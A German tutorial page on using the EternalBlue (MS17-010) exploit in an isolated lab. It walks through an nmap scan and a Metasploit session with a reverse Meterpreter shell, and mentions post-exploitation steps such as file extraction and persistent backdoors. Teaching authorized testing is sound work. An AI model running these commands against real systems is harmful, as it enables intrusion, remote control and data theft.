---
description: >-
  In diesem Abschnitt wird exemplarisch gezeigt, wie du mit dem Exploit in einer
  autorisierten Testumgebung vorgehen kannst. Wir verwenden dazu Metasploit, da
  es eine etablierte Plattform für solche Tes
---

# 2. Praxisanleitung – Wie man EternalBlue einsetzt

#### 2.1 Vorbereitung der Testumgebung

* **Lab-Setup:**
  * Erstelle eine isolierte Testumgebung (z. B. mithilfe von VirtualBox oder VMware), die ein ungepatchtes Windows-System (z. B. Windows 7 oder Windows Server 2008) enthält.
  * Stelle sicher, dass dein Testnetzwerk keine Verbindung zu Produktionssystemen hat.
* **Zielerkennung:**
  * Scanne das Netzwerk, um potenzielle Ziele zu identifizieren, die SMB über Port 445 anbieten.
  *   Verwende Nmap, um zu überprüfen, ob MS17‑010 anfällig ist:

      ```bash
      nmap -p445 --script smb-vuln-ms17-010 <Ziel-IP>
      ```
  * Ein positiver Befund weist auf eine Anfälligkeit hin.

#### 2.2 Exploit mit Metasploit einsetzen

1.  **Metasploit starten:**\
    Öffne ein Terminal in deiner Testumgebung (Kali Linux beispielsweise) und starte die msfconsole:

    ```bash
    msfconsole
    ```
2.  **Modul auswählen:**\
    Lade das Exploit-Modul für EternalBlue (MS17‑010):

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    ```
3. **Einstellungen konfigurieren:**
   * **Zielsystem (RHOSTS):** Setze die IP-Adresse des Zielsystems.
   * **Angreifer-IP (LHOST):** Gib die IP-Adresse deines Testsystems (bzw. deiner Angriffsplattform) an, auf die der Rückkanal zeigt.
   *   **Payload:** Wähle einen passenden Payload aus, z. B. den Reverse Meterpreter:

       ```bash
       set payload windows/meterpreter/reverse_tcp
       ```
   *   **Weitere Optionen:**\
       Prüfe mit dem Befehl `show options` alle erforderlichen Einstellungen und passe sie gegebenenfalls an. Ein Beispiel:

       ```bash
       set RHOSTS 192.168.1.100
       set LHOST 192.168.1.50
       set LPORT 4444
       ```
4.  **Exploit ausführen:**\
    Nachdem alle Optionen gesetzt wurden, starte den Exploit:

    ```bash
    exploit
    ```

    * Falls das Ziel anfällig ist, sollte eine Verbindung aufgebaut und idealerweise eine Meterpreter-Shell gestartet werden.
5. **Nach dem Exploit – Post-Exploitation:**
   *   Erhalte Informationen über das Ziel mittels:

       ```bash
       sysinfo
       getuid
       ```
   * Führe weitere Post-Exploitation-Aktivitäten aus, wie z. B. Dateiextraktion, Netzwerk-Scanning oder das Erstellen persistenter Backdoors (nur in autorisierten Tests).

#### 2.3 Wichtige Hinweise und alternative Ansätze

* **Exploit-Erfolg:**\
  EternalBlue funktioniert nur auf Systemen, die nicht gepatcht sind. In aktuellen Netzwerken ist oft SMBv1 deaktiviert und MS17‑010 bereits behoben.
* **Zuverlässigkeit:**\
  Der Exploit kann in einigen Fällen instabil sein. Es kann hilfreich sein, zusätzliche Module (z. B. „doublepulsar“ oder manuelle Payload-Injektionen) in Betracht zu ziehen, sofern diese in deinem Testumfeld eingesetzt werden dürfen.
* **Alternativen:**\
  Neben Metasploit existieren auch PoC-Skripte und eigenständige Tools (z. B. aus GitHub) für EternalBlue. Diese erfordern jedoch meist zusätzliche Anpassungen und sind weniger benutzerfreundlich als der Metasploit-Ansatz.
